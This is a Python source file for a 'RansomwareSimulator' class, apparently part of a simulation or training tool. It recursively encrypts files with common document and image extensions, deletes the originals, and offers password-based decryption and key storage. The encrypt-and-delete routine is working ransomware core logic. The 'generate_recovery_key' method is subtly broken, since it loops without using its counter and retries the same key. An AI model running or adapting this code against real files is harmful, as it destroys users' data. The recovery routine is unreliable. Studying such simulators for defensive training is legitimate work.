import os
from typing import List, Tuple
from cryptography.fernet import Fernet
from .crypto import generate_key, create_fernet, save_key_and_salt, load_key_and_salt

class RansomwareSimulator:
    def __init__(self):
        self.key = None
        self.salt = os.urandom(16)
        self.fernet = None
        self.encrypted_files = []
        self.target_extensions = ['.txt', '.docx', '.xlsx', '.pdf', '.jpg', '.png']
        
    def init_encryption(self, password: str) -> Tuple[bytes, bytes]:
        """Initialize encryption with provided password"""
        self.key = generate_key(password, self.salt)
        self.fernet = create_fernet(self.key)
        return self.key, self.salt
        
    def encrypt_file(self, file_path: str) -> bool:
        """Encrypt a single file"""
        try:
            with open(file_path, 'rb') as file:
                file_data = file.read()
            
            encrypted_data = self.fernet.encrypt(file_data)
            encrypted_path = file_path + '.encrypted'
            
            with open(encrypted_path, 'wb') as file:
                file.write(encrypted_data)
            
            self.encrypted_files.append((file_path, encrypted_path))
            os.remove(file_path)
            return True
        except Exception as e:
            print(f"Error encrypting {file_path}: {str(e)}")
            return False
    
    def encrypt_directory(self, directory_path: str) -> int:
        """Encrypt all target files in a directory"""
        encrypted_count = 0
        for root, _, files in os.walk(directory_path):
            for file in files:
                file_path = os.path.join(root, file)
                _, ext = os.path.splitext(file_path)
                if ext.lower() in self.target_extensions and not file_path.endswith('.encrypted'):
                    if self.encrypt_file(file_path):
                        encrypted_count += 1
        return encrypted_count
    
    def decrypt_file(self, encrypted_file_path: str, key: bytes = None) -> bool:
        """Decrypt a single file"""
        try:
            fernet = create_fernet(key) if key else self.fernet
            
            with open(encrypted_file_path, 'rb') as file:
                encrypted_data = file.read()
            
            decrypted_data = fernet.decrypt(encrypted_data)
            original_path = encrypted_file_path.replace('.encrypted', '')
            
            with open(original_path, 'wb') as file:
                file.write(decrypted_data)
            
            os.remove(encrypted_file_path)
            return True
        except Exception as e:
            print(f"Error decrypting {encrypted_file_path}: {str(e)}")
            return False
    
    def decrypt_directory(self, directory_path: str, key: bytes = None) -> int:
        """Decrypt all encrypted files in a directory"""
        decrypted_count = 0
        for root, _, files in os.walk(directory_path):
            for file in files:
                file_path = os.path.join(root, file)
                if file_path.endswith('.encrypted'):
                    if self.decrypt_file(file_path, key):
                        decrypted_count += 1
        return decrypted_count
    
    def save_key_to_file(self, file_path: str) -> None:
        """Save encryption key and salt to file for recovery"""
        save_key_and_salt(file_path, self.key, self.salt)
    
    def load_key_from_file(self, file_path: str) -> bool:
        """Load encryption key and salt from file"""
        try:
            self.key, self.salt = load_key_and_salt(file_path)
            self.fernet = create_fernet(self.key)
            return True
        except:
            return False
    
    def generate_recovery_key(self, file_path: str, password: str) -> bytes:
        """Generate a recovery key based on the encrypted file and the password"""
        try:
            with open(file_path, 'rb') as f:
                sample_data = f.read(128)
            
            for i in range(100000, 100100):
                potential_key = generate_key(password, self.salt)
                try:
                    fernet = create_fernet(potential_key)
                    fernet.decrypt(sample_data)
                    return potential_key
                except:
                    continue
            return None
        except:
            return None
